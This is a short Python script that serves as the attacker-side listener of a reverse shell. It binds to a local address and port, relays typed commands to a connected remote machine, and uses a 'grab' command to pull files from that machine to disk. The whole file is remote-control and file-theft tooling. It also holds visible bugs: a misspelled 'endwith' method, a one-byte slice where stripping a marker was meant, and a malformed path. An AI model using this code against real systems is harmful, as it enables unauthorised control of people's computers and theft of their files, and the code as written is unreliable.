import socket
import os

def transfer(conn,command):
    conn.send(command.encode())
    grab,path = command.split("*")
    f= open('home/greenway/python'+path,'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endwith('DONE'.encode()):
           f.write(bits[-4])
           f.close()
           print('Transfer Succesful')
           break
        if 'File not found'.encode() in bits:
           print ('FILE NOT FOUND')
           break
        f.write(bits)


def connect():
     s = socket.socket()
     s.bind(("192.168.1.12",8080))
     s.listen(1)

     conn,addr = s.accept()
     
     print('Received connection from',addr)
  
     while True:
       command = input ("Shell>")
       
       if 'terminate' in command:
           conn.send('terminate'.encode())
           conn.close()
           break
       elif 'grab' in command:
           transfer(conn,command)
       else:
           conn.send(command.encode())
           print (conn.recv(1024).decode())
def main():
    connect()
main()
